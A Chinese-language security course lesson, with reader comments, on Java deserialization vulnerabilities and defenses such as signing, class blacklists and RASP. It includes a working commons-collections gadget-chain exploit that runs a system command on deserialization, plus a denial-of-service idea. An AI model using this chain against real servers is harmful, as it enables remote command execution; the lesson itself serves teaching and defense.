{"id":182421,"title":"09 | 反序列化漏洞：使用了编译型语言，为什么还是会被注入？","content":"<p>你好，我是何为舟。</p><p>我们都知道，Java是一种高层级的语言。在Java中，你不需要直接操控内存，大部分的服务和组件都已经有了成熟的封装。除此之外，Java是一种先编译再执行的语言，无法像JavaScript那样随时插入一段代码。因此，很多人会认为，Java是一个安全的语言。如果使用Java开发服务，我们只需要考虑逻辑层的安全问题即可。但是，Java真的这么安全吗？</p><p>2015年，Java曾被曝出一个严重的漏洞，很多经典的商业框架都因此受到影响，其中最知名的是<a href=\"https://baike.baidu.com/item/weblogic/451978?fr=aladdin\">WebLogic</a>。据统计，在网络中公开的WebLogic服务有3万多个。其中，中国就有1万多个外网可访问的WebLogic服务。因此，WebLogic的反序列化漏洞意味着，国内有1万多台服务器可能会被黑客攻陷，其影响的用户数量更是不可估量的。</p><p>你可能要说了，我实际工作中并没有遇到过反序列化漏洞啊。但是，你一定使用过一些序列化和反序列化的工具，比如Fastjson和Jackson等。如果你关注这些工具的版本更新，就会发现，这些版本更新中包含很多修复反序列化漏洞的改动。而了解反序列化漏洞，可以让你理解，Java作为一种先打包后执行的语言，是如何被插入额外逻辑的；也能够让你对Java这门语言的安全性，有一个更全面的认知。</p><!-- [[[read_end]]] --><p>那么，到底什么是反序列化漏洞呢？它究竟会对Java的安全带来哪些冲击呢？遇到这些冲击，我们该怎么办呢？今天我就带你来了解反序列化漏洞，然后一起学习如何防护这样的攻击！</p><h2>反序列化漏洞是如何产生的？</h2><p>如果你是研发人员，工作中一定会涉及很多的序列化和反序列化操作。应用在输出某个数据的时候，将对象转化成字符串或者字节流，这就是序列化操作。那什么是反序列化呢？没错，我们把这个过程反过来，就是反序列化操作，也就是应用将字符串或者字节流变成对象。</p><p>序列化和反序列化有很多种实现方式。比如Java中的Serializable接口（或者Python中的pickle）可以把应用中的对象转化为二进制的字节流，把字节流再还原为对象；还有XML和JSON这些跨平台的协议，可以把对象转化为带格式的文本，把文本再还原为对象。</p><p>那反序列化漏洞到底是怎么产生的呢？问题就出在把数据转化成对象的过程中。在这个过程中，应用需要根据数据的内容，去调用特定的方法。而黑客正是利用这个逻辑，在数据中嵌入自定义的代码（比如执行某个系统命令）。应用对数据进行反序列化的时候，会执行这段代码，从而使得黑客能够控制整个应用及服务器。这就是反序列化漏洞攻击的过程。</p><p>事实上，基本上所有语言都会涉及反序列化漏洞。其中，Java因为使用范围比较广，本身体积也比较庞大， 所以被曝出的反序列化漏洞最多。下面，我就以Java中一个经典的反序列化漏洞demo  <a href=\"https://github.com/frohoff/ysoserial\">ysoserial</a>  为基础，来介绍一个经典的反序列化漏洞案例，给你讲明白反序列化漏洞具体的产生过程。了解漏洞是怎么产生的，对于你后面理解防护措施也会非常有帮助，所以这里你一定要认真看。</p><p>不过，这里也先提醒你一下，这块原理的内容相对比较复杂。我会尽量给你讲解清楚，讲完之后，我也会带着你对这部分内容进行总结、复习。重复记忆可以加深理解，这块内容建议你可以多看几遍。好了，下面我们就来看这个案例！</p><p>最终的演示demo的代码如下所示。在macOS环境下运行这段代码，你就能够打开一个计算器。（在Windows环境下，将系统命令open -a calculator修改成calc即可。）注意，这里需要依赖3.2.1以下的commons-collections，最新的版本已经对这个漏洞进行了修复，所以无法重现这个攻击的过程。</p><pre><code>public class Deserialize {\n    public static void main(String... args) throws ClassNotFoundException, IllegalAccessException, InvocationTargetException, InstantiationException, IOException, NoSuchMethodException {\n        Object evilObject = getEvilObject();\n        byte[] serializedObject = serializeToByteArray(evilObject);\n        deserializeFromByteArray(serializedObject);\n    }\n\n    public static Object getEvilObject() throws ClassNotFoundException, IllegalAccessException, InvocationTargetException, InstantiationException, NoSuchMethodException {\n        String[] command = {&quot;open -a calculator&quot;};\n\n        final Transformer[] transformers = new Transformer[]{\n                new ConstantTransformer(Runtime.class),\n                new InvokerTransformer(&quot;getMethod&quot;,\n                        new Class[]{String.class, Class[].class},\n                        new Object[]{&quot;getRuntime&quot;, new Class[0]}\n                ),\n                new InvokerTransformer(&quot;invoke&quot;,\n                        new Class[]{Object.class, Object[].class},\n                        new Object[]{null, new Object[0]}\n                ),\n                new InvokerTransformer(&quot;exec&quot;,\n                        new Class[]{String.class},\n                        command\n                )\n        };\n\n        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);\n\n        Map map = new HashMap&lt;&gt;();\n        Map lazyMap = LazyMap.decorate(map, chainedTransformer);\n\n        String classToSerialize = &quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;;\n        final Constructor&lt;?&gt; constructor = Class.forName(classToSerialize).getDeclaredConstructors()[0];\n        constructor.setAccessible(true);\n        InvocationHandler secondInvocationHandler = (InvocationHandler) constructor.newInstance(Override.class, lazyMap);\n        Proxy evilProxy = (Proxy) Proxy.newProxyInstance(Deserialize.class.getClassLoader(), new Class[]{Map.class}, secondInvocationHandler);\n\n        InvocationHandler invocationHandlerToSerialize = (InvocationHandler) constructor.newInstance(Override.class, evilProxy);\n\n        return invocationHandlerToSerialize;\n\n        /*Transformer[] transformers = new Transformer[] {\n                new ConstantTransformer(Runtime.class),\n                new InvokerTransformer(&quot;getMethod&quot;, new Class[] {\n                        String.class, Class[].class }, new Object[] {\n                        &quot;getRuntime&quot;, new Class[0] }),\n                new InvokerTransformer(&quot;invoke&quot;, new Class[] {\n                        Object.class, Object[].class }, new Object[] {\n                        null, new Object[0] }),\n                new InvokerTransformer(&quot;exec&quot;, new Class[] {\n                        String.class }, new Object[] {&quot;open -a calculator&quot;})};\n\n        Transformer chain = new ChainedTransformer(transformers);\n        Map innerMap = new HashMap&lt;String, Object&gt;();\n        innerMap.put(&quot;key&quot;, &quot;value&quot;);\n        Map&lt;String, Object&gt; outerMap = TransformedMap.decorate(innerMap, null, chain);\n        Class cl = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);\n        Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);\n        ctor.setAccessible(true);\n        Object instance = ctor.newInstance(Target.class, outerMap);\n        return instance;*/\n    }\n\n    public static void deserializeAndDoNothing(byte[] byteArray) throws IOException, ClassNotFoundException {\n        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(byteArray));\n        ois.readObject();\n    }\n\n    public static byte[] serializeToByteArray(Object object) throws IOException {\n        ByteArrayOutputStream serializedObjectOutputContainer = new ByteArrayOutputStream();\n        ObjectOutputStream objectOutputStream = new ObjectOutputStream(serializedObjectOutputContainer);\n        objectOutputStream.writeObject(object);\n        return serializedObjectOutputContainer.toByteArray();\n    }\n\n    public static Object deserializeFromByteArray(byte[] serializedObject) throws IOException, ClassNotFoundException {\n        ByteArrayInputStream serializedObjectInputContainer = new ByteArrayInputStream(serializedObject);\n        ObjectInputStream objectInputStream = new ObjectInputStream(serializedObjectInputContainer);\n        InvocationHandler evilInvocationHandler = (InvocationHandler) objectInputStream.readObject();\n        return evilInvocationHandler;\n    }\n}\n</code></pre><p>下面我们来分析一下这段代码的逻辑。</p><p>在Java通过<code>ObjectInputStream.readObject()</code>进行反序列化操作的时候，ObjectInputStream会根据序列化数据寻找对应的实现类（在payload中是<code>sun.reflect.annotation.AnnotationInvocationHandler</code>）。如果实现类存在，Java就会调用其readObject方法。因此，<code>AnnotationInvocationHandler.readObject</code>方法在反序列化过程中会被调用。</p><p><code>AnnotationInvocationHandler在readObject</code>的过程中会调用<code>streamVals.entrySet()</code>。其中，<code>streamVals</code>是<code>AnnotationInvocationHandler</code>构造函数中的第二个参数。这个参数可以在数据中进行指定。而黑客定义的是Proxy类，也就是说，黑客会让这个参数的实际值等于Proxy。</p><p><img src=\"https://static001.geekbang.org/resource/image/29/d7/294747330236323f2539ce1656eb9ed7.jpg?wh=1142*604\" alt=\"\"></p><p>Proxy是动态代理，它会基于Java反射机制去动态实现代理类的功能。在Java中，调用一个Proxy类的entrySet()方法，实际上就是在调用<code>InvocationHandler中的invoke</code>方法。在invoke方法中，Java又会调用<code>memberValues.get(member)</code>。其中，<code>memberValues</code>是<code>AnnotationInvocationHandler</code>构造函数中的第二个参数。</p><p>同样地，<code>memberValues</code>这个参数也能够在数据中进行指定，而这次黑客定义的就是LazyMap类。member是方法名，也就是entrySet。因此，我们最终会调用到<code>LazyMap.get(\"entrySet\")</code>这个逻辑。</p><p><img src=\"https://static001.geekbang.org/resource/image/f8/fe/f8390216be34758ef0ee27946369c9fe.jpg?wh=958*858\" alt=\"\"></p><p>当LazyMap需要get某个参数的时候，如果之前没有获取过，则会调用<code>ChainedTransformer.transform</code>进行构造。</p><p><img src=\"https://static001.geekbang.org/resource/image/d6/57/d6540c248b8dfc16ae66767a1382da57.jpg?wh=740*324\" alt=\"\"></p><p><code>ChainedTransformer.transform</code>会将我们构造的几个InvokerTransformer顺次执行。而在<code>InvokerTransformer.transform</code>中，它会通过反射的方法，顺次执行我们定义好的Java语句，最终调用<code>Runtime.getRuntime().exec(\"open -a calculator\")</code>实现命令执行的功能。</p><p><img src=\"https://static001.geekbang.org/resource/image/6b/ae/6ba2e4e30bf7a0e6b8973a22f2deefae.jpg?wh=820*252\" alt=\"\"></p><p>好了，讲了这么多，不知道你理解了多少？这个过程的确比较烧脑。我带你再来总结一下，简单来说，其实就是以下4步：</p><ol>\n<li>黑客构造一个恶意的<strong>调用链</strong>（专业术语为POP，Property Oriented Programming），并将其序列化成数据，然后发送给应用；</li>\n<li>应用接收数据。大部分应用都有接收外部输入的地方，比如各种HTTP接口。而这个输入的数据就有可能是序列化数据；</li>\n<li>应用进行反序列操作。收到数据后，应用尝试将数据构造成对象；</li>\n<li>应用在反序列化过程中，会调用黑客构造的调用链，使得应用会执行黑客的任意命令。</li>\n</ol><p>那么，在这个反序列化的过程中，应用为什么会执行黑客构造的调用链呢？这是因为，<strong>反序列化的过程其实就是一个数据到对象的过程</strong>。在这个过程中，应用必须根据数据源去调用一些默认方法（比如构造函数和Getter/Setter）。</p><p>除了这些方法，反序列化的过程中，还会涉及一些接口类或者基类（简单的如：Map、List和Object）。应用也必须根据数据源，去判断选择哪一个具体的接口实现类。也就是说，黑客可以控制反序列化过程中，应用要调用的接口实现类的默认方法。通过对不同接口类的默认方法进行组合，黑客就可以控制反序列化的调用过程，实现执行任意命令的功能。</p><h2>通过反序列化漏洞，黑客能做什么？</h2><p>学习了前面的例子，我们已经知道，通过反序列化漏洞，黑客可以调用到<code>Runtime.exec()</code>来进行命令执行。换一句话说，黑客已经能够在服务器上执行任意的命令，这就相当于间接掌控了你的服务器，能够干任何他想干的事情了。</p><p>即使你对服务器进行了一定的安全防护，控制了黑客掌控服务器所产生的影响，黑客还是能够利用反序列化漏洞，来发起拒绝服务攻击。比如，曾经有人就提出过这样的方式，通过HashSet的相互引用，构造出一个100层的HashSet，其中包含200个HashSet的实例和100个String，结构如下图所示。</p><p><img src=\"https://static001.geekbang.org/resource/image/db/03/dbc68b00d365fba99361a49128a69703.jpg?wh=846*535\" alt=\"\"></p><p>对于多层嵌套的对象，Java在反序列化过程中，需要调用的方法呈指数增加。因此，尽管这个序列化的数组大概只有6KB，但是面对这种100层的数据，Java所需要执行的方法数是近乎无穷的（n的100次方）。也就是说，黑客可以通过构建一个体积很小的数据，增加应用在反序列化过程中需要调用的方法数，以此来耗尽CPU资源，达到影响服务器可用性的目的。</p><h2>如何进行反序列化漏洞防护 ？</h2><p>现在，你应该对序列化和反序列化的操作产生了一些警惕。那你可能要问了，既然反序列化漏洞危害这么大，我们能不能直接剔除它们呢？显然是不可能的，尤其是JSON，作为目前最热门的跨平台数据交换格式之一，其易用性是显而易见的，你不可能因为这些还没发生的危害就剔除它们。因此，我们要采取一些有效的手段，在把反序列化操作的优势发挥出来的同时，去避免反序列化漏洞的出现。我们来看3种具体的防护方法：认证、限制类和RASP检测。</p><h3>1.认证和签名</h3><p>首先，最简单的，我们可以通过认证，来避免应用接受黑客的异常输入。要知道，很多序列化和反序列化的服务并不是提供给用户的，而是提供给服务自身的。比如，存储一个对象到硬盘、发送一个对象到另外一个服务中去。对于这些点对点的服务，我们可以通过加入签名的方式来进行防护。比如，对存储的数据进行签名，以此对调用来源进行身份校验。只要黑客获取不到密钥信息，它就无法向进行反序列化的服务接口发送数据，也就无从发起反序列化攻击了。</p><h3>2.限制序列化和反序列化的类</h3><p>事实上，认证只是隐藏了反序列化漏洞，并没有真正修复它。那么，我们该如何从根本上去修复或者避免反序列化漏洞呢？</p><p>在反序列化漏洞中，黑客需要构建调用链，而调用链是基于类的默认方法来构造的。然而，大部分类的默认方法逻辑很少，无法串联成完整调用链。因此，在调用链中通常会涉及非常规的类，比如，刚才那个demo中的InvokerTransformer。我相信99.99%的人都不会去序列化这个类。因此，我们可以通过构建黑名单的方式，来检测反序列化过程中调用链的异常。</p><p>在Fastjson的配置文件中，就维护了一个黑名单的<a href=\"https://github.com/alibaba/fastjson/blob/d52085ef54b32dfd963186e583cbcdfff5d101b5/src/main/java/com/alibaba/fastjson/parser/ParserConfig.java\">列表</a>，其中包括了很多可能执行代码的方法类。这些类都是平常会使用，但不会序列化的一些工具类，因此我们可以将它们纳入到黑名单中，不允许应用反序列化这些类（在最新的版本中，已经更改为hashcode的形式）。</p><p>我们在日常使用Fastjson或者其他JSON转化工具的过程中，需要注意避免序列化和反序列化接口类。这就相当于白名单的过滤：只允许某些类可以被反序列化。我认为，只要你在反序列化的过程中，避免了所有的接口类（包括类成员中的接口、泛型等），黑客其实就没有办法控制应用反序列化过程中所使用的类，也就没有办法构造出调用链，自然也就无法利用反序列化漏洞了。</p><h3>3.RASP检测</h3><p>通常来说，我们可以依靠第三方插件中自带的黑名单来提高安全性。但是，如果我们使用的是Java自带的序列化和反序列化功能（比如<code>ObjectInputStream.resolveClass</code>），那我们该怎么防护反序列化漏洞呢？如果我们想要替这些方法实现黑名单的检测，就会涉及原生代码的修改，这显然是一件比较困难的事。</p><p>为此，业内推出了RASP（Runtime Application Self-Protection，实时程序自我保护）。RASP通过hook等方式，在这些关键函数的调用中，增加一道规则的检测。这个规则会判断应用是否执行了非应用本身的逻辑，能够在不修改代码的情况下对反序列化漏洞攻击实现拦截。关于RASP，之后的课程中我们会专门进行讲解，这里暂时不深入了。简单来说，通过RASP，我们就能够检测到应用中的非正常代码执行操作。</p><p><strong>我个人认为，<a href=\"https://www.freebuf.com/articles/web/197823.html\">RASP</a>是最好的检测反序列化攻击的方式。</strong> 我为什么会这么说呢？这是因为，如果使用认证和限制类这样的方式来检测，就需要一个一个去覆盖可能出现的漏洞点，非常耗费时间和精力。而RASP则不同，它通过hook的方式，直接将整个应用都监控了起来。因此，能够做到覆盖面更广、代码改动更少。</p><p>但是，因为RASP会hook应用，相当于是介入到了应用的正常流程中。而RASP的检测规则都不高效，因此，它会给应用带来一定的性能损耗，不适合在高并发的场景中使用。但是，在应用不受严格性能约束的情况下，我还是更推荐使用RASP。这样，开发就不用一个一个去对漏洞点进行手动修补了。</p><h2>总结</h2><p>好了，今天的内容讲完了。我们来一起总结回顾一下，你需要掌握的重点内容。</p><p>我们首先讲了反序列化漏洞的产生原理，即黑客通过构造恶意的序列化数据，从而控制应用在反序列化过程中需要调用的类方法，最终实现任意方法调用。如果在这些方法中有命令执行的方法，黑客就可以在服务器上执行任意的命令。</p><p>对于反序列化漏洞的防御，我们主要考虑两个方面：认证和检测。对于面向内部的接口和服务，我们可以采取认证的方式，杜绝它们被黑客利用的可能。另外，我们也需要对反序列化数据中的调用链进行黑白名单检测。成熟的第三方序列化插件都已经包含了这个功能，暂时可以不需要考虑。最后，如果没有过多的性能考量，我们可以通过RASP的方式，来进行一个更全面的检测和防护。</p><p>最后，为了方便你记忆，我把今天的内容总结成一张知识脑图，你可以通过它对今天的重点内容进行复习巩固。</p><p><img src=\"https://static001.geekbang.org/resource/image/b7/37/b79f722212c5a2582d9f5fbf15081337.jpg?wh=1142*888\" alt=\"\"></p><h2>思考题</h2><p>最后，给你留一个思考题。</p><p>你可以去了解一下，你所使用的序列化和反序列化插件（比如Fastjson、Gson和Jackson等），是否被曝出过反序列化漏洞？然后结合今天的内容思考一下，这些反序列化漏洞，可能会给你带来什么影响。</p><p>欢迎留言和我分享你的思考和疑惑，也欢迎你把文章分享给你的朋友。我们下一讲再见！</p>","comments":[{"had_liked":false,"id":166642,"user_name":"小晏子","can_delete":false,"product_type":"c1","uid":1132337,"ip_address":"","ucode":"3AAA6FB5ACB6AE","user_header":"https://static001.geekbang.org/account/avatar/00/11/47/31/f35367c8.jpg","comment_is_top":false,"comment_ctime":1577527564,"is_pvip":false,"replies":[{"id":"63852","content":"是的，fastjson已经曝出过好几次反序列化漏洞了。","user_name":"作者回复","user_name_real":"captain","uid":"1012580","ctime":1577584154,"ip_address":"","comment_id":166642,"utype":1}],"discussion_count":1,"race_medal":0,"score":"31642298636","product_id":100041701,"comment_content":"用过fastjson，Fastjson 1.2.24就有反序列化漏洞，这个漏洞能让黑客在服务器上执行任何命令，如果服务器开了open api，且接受参数中有json数据，json解析引用了fastjson 1.2.24，那就有很大的安全风险，拒绝服务攻击，被删除服务器文件，服务器系统被破坏，都是完全可能的。","like_count":7,"discussions":[{"author":{"id":1012580,"avatar":"","nickname":"captain","note":"","ucode":"471A8412D923EB","race_medal":0,"user_type":2,"is_pvip":false},"reply_author":{"id":0,"avatar":"","nickname":"","note":"","ucode":"","race_medal":0,"user_type":1,"is_pvip":false},"discussion":{"id":479565,"discussion_content":"是的，fastjson已经曝出过好几次反序列化漏洞了。","likes_number":0,"is_delete":false,"is_hidden":false,"ctime":1577584154,"is_liked":false,"can_delete":false,"is_complain":false,"is_top":true,"parent_id":0,"ip_address":""},"score":2,"extra":"{\"reply\":true,\"user_type\":2}","child_discussion_number":0,"child_discussions":[]}]},{"had_liked":false,"id":247233,"user_name":"darren","can_delete":false,"product_type":"c1","uid":1027735,"ip_address":"","ucode":"386736C90F32CA","user_header":"https://static001.geekbang.org/account/avatar/00/0f/ae/97/ba512167.jpg","comment_is_top":false,"comment_ctime":1599638307,"is_pvip":false,"replies":[{"id":"91377","content":"gson相对安全，protobuf这种限制了数据类型，也比较安全","user_name":"作者回复","user_name_real":"captain","uid":"1012580","ctime":1600401658,"ip_address":"","comment_id":247233,"utype":1}],"discussion_count":1,"race_medal":0,"score":"14484540195","product_id":100041701,"comment_content":"公司安服，说禁止使用jackson、fastjson，我能用什么呢，protobuf这类会安全些吗?","like_count":3,"discussions":[{"author":{"id":1012580,"avatar":"","nickname":"captain","note":"","ucode":"471A8412D923EB","race_medal":0,"user_type":2,"is_pvip":false},"reply_author":{"id":0,"avatar":"","nickname":"","note":"","ucode":"","race_medal":0,"user_type":1,"is_pvip":false},"discussion":{"id":505347,"discussion_content":"gson相对安全，protobuf这种限制了数据类型，也比较安全","likes_number":0,"is_delete":false,"is_hidden":false,"ctime":1600401658,"is_liked":false,"can_delete":false,"is_complain":false,"is_top":true,"parent_id":0,"ip_address":""},"score":2,"extra":"{\"reply\":true,\"user_type\":2}","child_discussion_number":0,"child_discussions":[]}]},{"had_liked":false,"id":190506,"user_name":"Zane","can_delete":false,"product_type":"c1","uid":1082802,"ip_address":"","ucode":"C96470F9CBEE8B","user_header":"https://static001.geekbang.org/account/avatar/00/10/85/b2/18f3a4ea.jpg","comment_is_top":false,"comment_ctime":1584665647,"is_pvip":false,"replies":[{"id":"73480","content":"JSON还是现在最普遍的序列化工具吧，注意及时更新三方插件，基本还是没问题的。","user_name":"作者回复","user_name_real":"captain","uid":"1012580","ctime":1584808077,"ip_address":"","comment_id":190506,"utype":1}],"discussion_count":1,"race_medal":0,"score":"10174600239","product_id":100041701,"comment_content":"JSON反序列化可能有风险，所以大多数App的网络请求数据使用表单么？","like_count":2,"discussions":[{"author":{"id":1012580,"avatar":"","nickname":"captain","note":"","ucode":"471A8412D923EB","race_medal":0,"user_type":2,"is_pvip":false},"reply_author":{"id":0,"avatar":"","nickname":"","note":"","ucode":"","race_medal":0,"user_type":1,"is_pvip":false},"discussion":{"id":487994,"discussion_content":"JSON还是现在最普遍的序列化工具吧，注意及时更新三方插件，基本还是没问题的。","likes_number":0,"is_delete":false,"is_hidden":false,"ctime":1584808077,"is_liked":false,"can_delete":false,"is_complain":false,"is_top":true,"parent_id":0,"ip_address":""},"score":2,"extra":"{\"reply\":true,\"user_type\":2}","child_discussion_number":0,"child_discussions":[]}]},{"had_liked":false,"id":166306,"user_name":"alan","can_delete":false,"product_type":"c1","uid":1083425,"ip_address":"","ucode":"2CA8D0B6B7D5A9","user_header":"https://static001.geekbang.org/account/avatar/00/10/88/21/50b2418a.jpg","comment_is_top":false,"comment_ctime":1577436134,"is_pvip":false,"replies":[{"id":"63427","content":"应该是跟所有漏洞风险都有关系，最小权限永远都是最佳实践～","user_name":"作者回复","user_name_real":"captain","uid":"1012580","ctime":1577450461,"ip_address":"","comment_id":166306,"utype":1}],"discussion_count":1,"race_medal":0,"score":"10167370726","product_id":100041701,"comment_content":"一般说运行web服务时，不要使用root权限，这跟反序列化漏洞的风险也有关系吧？","like_count":3,"discussions":[{"author":{"id":1012580,"avatar":"","nickname":"captain","note":"","ucode":"471A8412D923EB","race_medal":0,"user_type":2,"is_pvip":false},"reply_author":{"id":0,"avatar":"","nickname":"","note":"","ucode":"","race_medal":0,"user_type":1,"is_pvip":false},"discussion":{"id":479483,"discussion_content":"应该是跟所有漏洞风险都有关系，最小权限永远都是最佳实践～","likes_number":0,"is_delete":false,"is_hidden":false,"ctime":1577450461,"is_liked":false,"can_delete":false,"is_complain":false,"is_top":true,"parent_id":0,"ip_address":""},"score":2,"extra":"{\"reply\":true,\"user_type\":2}","child_discussion_number":0,"child_discussions":[]}]},{"had_liked":false,"id":250622,"user_name":"cambrian","can_delete":false,"product_type":"c1","uid":1640144,"ip_address":"","ucode":"794BF51C7BB33A","user_header":"http://thirdwx.qlogo.cn/mmopen/vi_32/DYAIOgq83eoaJI2EYKYEmIwtEECSg8RqlHe3OVJ7yOfH6NdPZ7vGIFTneHvJ2EdTPticoIvvIcV649geuPjUqWQ/132","comment_is_top":false,"comment_ctime":1601175217,"is_pvip":false,"discussion_count":0,"race_medal":0,"score":"5896142513","product_id":100041701,"comment_content":"Apache shiro反序列化漏洞","like_count":1},{"had_liked":false,"id":211461,"user_name":"翠羽香凝","can_delete":false,"product_type":"c1","uid":1119933,"ip_address":"","ucode":"54F3762F0E545F","user_header":"https://static001.geekbang.org/account/avatar/00/11/16/bd/e14ba493.jpg","comment_is_top":false,"comment_ctime":1587967421,"is_pvip":false,"replies":[{"id":"78952","content":"报错不重要，只要成功执行命令，打开计算器了就说明成功了。","user_name":"作者回复","user_name_real":"captain","uid":"1012580","ctime":1588145588,"ip_address":"","comment_id":211461,"utype":1}],"discussion_count":2,"race_medal":0,"score":"5882934717","product_id":100041701,"comment_content":"老师给的示例代码，难道只有我一个人没有重现出来吗？重现的时候代码运行，报java.lang.Override missing element entrySet错误","like_count":1,"discussions":[{"author":{"id":1012580,"avatar":"","nickname":"captain","note":"","ucode":"471A8412D923EB","race_medal":0,"user_type":2,"is_pvip":false},"reply_author":{"id":0,"avatar":"","nickname":"","note":"","ucode":"","race_medal":0,"user_type":1,"is_pvip":false},"discussion":{"id":493274,"discussion_content":"报错不重要，只要成功执行命令，打开计算器了就说明成功了。","likes_number":0,"is_delete":false,"is_hidden":false,"ctime":1588145588,"is_liked":false,"can_delete":false,"is_complain":false,"is_top":true,"parent_id":0,"ip_address":""},"score":2,"extra":"{\"reply\":true,\"user_type\":2}","child_discussion_number":0,"child_discussions":[]},{"author":{"id":1257418,"avatar":"https://static001.geekbang.org/account/avatar/00/13/2f/ca/cbce6e94.jpg","nickname":"梦想的优惠券","note":"","ucode":"D3B44F6C618CA7","race_medal":1,"user_type":1,"is_pvip":false},"reply_author":{"id":0,"avatar":"","nickname":"","note":"","ucode":"","race_medal":0,"user_type":1,"is_pvip":false},"discussion":{"id":336574,"discussion_content":"要用那个注释的代码吧","likes_number":0,"is_delete":false,"is_hidden":false,"ctime":1608627487,"is_liked":false,"can_delete":false,"is_complain":false,"is_top":false,"parent_id":0,"ip_address":""},"score":2,"extra":"","child_discussion_number":0,"child_discussions":[]}]},{"had_liked":false,"id":166723,"user_name":"Cy23","can_delete":false,"product_type":"c1","uid":1591293,"ip_address":"","ucode":"8DC561C5151758","user_header":"https://static001.geekbang.org/account/avatar/00/18/47/fd/895f0c27.jpg","comment_is_top":false,"comment_ctime":1577577056,"is_pvip":false,"replies":[{"id":"63849","content":"这是文件上传漏洞，可以对上传文件的类型和存储的位置做限制，基本可以修复。","user_name":"作者回复","user_name_real":"captain","uid":"1012580","ctime":1577583406,"ip_address":"","comment_id":166723,"utype":1}],"discussion_count":1,"race_medal":0,"score":"5872544352","product_id":100041701,"comment_content":"漏洞是不是反系列化的同时执行了某个代码，<br>问个本课外问题，最近有台JAVA服务器，密码被破解，通过后台上传功能，上传*马图片和各种后缀页面，通过webshell获取服务器账号，访问sql2000数据库等，暂时还没想好怎么破，隐藏上传图片功能","like_count":1,"discussions":[{"author":{"id":1012580,"avatar":"","nickname":"captain","note":"","ucode":"471A8412D923EB","race_medal":0,"user_type":2,"is_pvip":false},"reply_author":{"id":0,"avatar":"","nickname":"","note":"","ucode":"","race_medal":0,"user_type":1,"is_pvip":false},"discussion":{"id":479603,"discussion_content":"这是文件上传漏洞，可以对上传文件的类型和存储的位置做限制，基本可以修复。","likes_number":0,"is_delete":false,"is_hidden":false,"ctime":1577583406,"is_liked":false,"can_delete":false,"is_complain":false,"is_top":true,"parent_id":0,"ip_address":""},"score":2,"extra":"{\"reply\":true,\"user_type\":2}","child_discussion_number":0,"child_discussions":[]}]},{"had_liked":false,"id":343124,"user_name":"wcf","can_delete":false,"product_type":"c1","uid":1829111,"ip_address":"","ucode":"6E3B0A47B963E7","user_header":"https://static001.geekbang.org/account/avatar/00/1b/e8/f7/1b45fa46.jpg","comment_is_top":false,"comment_ctime":1650640625,"is_pvip":true,"discussion_count":0,"race_medal":0,"score":"1650640625","product_id":100041701,"comment_content":"在 ubuntu20 桌面上, 命令换成 gnome-calculator &amp; 没有复现出来. jdk1.8_201, commons-collections:3.2","like_count":0},{"had_liked":false,"id":248877,"user_name":"goarulin","can_delete":false,"product_type":"c1","uid":1182286,"ip_address":"","ucode":"743910268E1999","user_header":"https://static001.geekbang.org/account/avatar/00/12/0a/4e/21c545f6.jpg","comment_is_top":false,"comment_ctime":1600344393,"is_pvip":false,"replies":[{"id":"91471","content":"报错是必然的，因为本来就是错误的输入。但不重要，只要成功执行命令就可以了。","user_name":"作者回复","user_name_real":"captain","uid":"1012580","ctime":1600651562,"ip_address":"","comment_id":248877,"utype":1}],"discussion_count":1,"race_medal":0,"score":"1600344393","product_id":100041701,"comment_content":"请问老师，我这执行了这段代码一直报Exception in thread &quot;main&quot; java.lang.annotation.IncompleteAnnotationException: java.lang.Override missing element entrySet","like_count":0,"discussions":[{"author":{"id":1012580,"avatar":"","nickname":"captain","note":"","ucode":"471A8412D923EB","race_medal":0,"user_type":2,"is_pvip":false},"reply_author":{"id":0,"avatar":"","nickname":"","note":"","ucode":"","race_medal":0,"user_type":1,"is_pvip":false},"discussion":{"id":505767,"discussion_content":"报错是必然的，因为本来就是错误的输入。但不重要，只要成功执行命令就可以了。","likes_number":0,"is_delete":false,"is_hidden":false,"ctime":1600651562,"is_liked":false,"can_delete":false,"is_complain":false,"is_top":true,"parent_id":0,"ip_address":""},"score":2,"extra":"{\"reply\":true,\"user_type\":2}","child_discussion_number":0,"child_discussions":[]}]},{"had_liked":false,"id":199199,"user_name":"COOK","can_delete":false,"product_type":"c1","uid":1233016,"ip_address":"","ucode":"0F1C0E7CA4F36B","user_header":"https://static001.geekbang.org/account/avatar/00/12/d0/78/a11a999d.jpg","comment_is_top":false,"comment_ctime":1585482146,"is_pvip":true,"discussion_count":0,"race_medal":0,"score":"1585482146","product_id":100041701,"comment_content":"加强反序列化的认证和检测，报文签名","like_count":0},{"had_liked":false,"id":193565,"user_name":"Teresa","can_delete":false,"product_type":"c1","uid":1021650,"ip_address":"","ucode":"CDAD64AE69659B","user_header":"https://static001.geekbang.org/account/avatar/00/0f/96/d2/ed0f408b.jpg","comment_is_top":false,"comment_ctime":1584927997,"is_pvip":false,"replies":[{"id":"73949","content":"大部分情况下，能够及时升级就足够了。","user_name":"作者回复","user_name_real":"captain","uid":"1012580","ctime":1585031806,"ip_address":"","comment_id":193565,"utype":1}],"discussion_count":1,"race_medal":0,"score":"1584927997","product_id":100041701,"comment_content":"Jackson Databind漏洞、apache log4j反序列化漏洞，我只知道通过及时升级jar包版本修复漏洞。","like_count":0,"discussions":[{"author":{"id":1012580,"avatar":"","nickname":"captain","note":"","ucode":"471A8412D923EB","race_medal":0,"user_type":2,"is_pvip":false},"reply_author":{"id":0,"avatar":"","nickname":"","note":"","ucode":"","race_medal":0,"user_type":1,"is_pvip":false},"discussion":{"id":488588,"discussion_content":"大部分情况下，能够及时升级就足够了。","likes_number":0,"is_delete":false,"is_hidden":false,"ctime":1585031806,"is_liked":false,"can_delete":false,"is_complain":false,"is_top":true,"parent_id":0,"ip_address":""},"score":2,"extra":"{\"reply\":true,\"user_type\":2}","child_discussion_number":0,"child_discussions":[]}]},{"had_liked":false,"id":193405,"user_name":"COOK","can_delete":false,"product_type":"c1","uid":1233016,"ip_address":"","ucode":"0F1C0E7CA4F36B","user_header":"https://static001.geekbang.org/account/avatar/00/12/d0/78/a11a999d.jpg","comment_is_top":false,"comment_ctime":1584892004,"is_pvip":true,"discussion_count":0,"race_medal":0,"score":"1584892004","product_id":100041701,"comment_content":"老师讲原理很透彻，多读几遍很有收获","like_count":0},{"had_liked":false,"id":172780,"user_name":"Cryhard","can_delete":false,"product_type":"c1","uid":1589593,"ip_address":"","ucode":"E0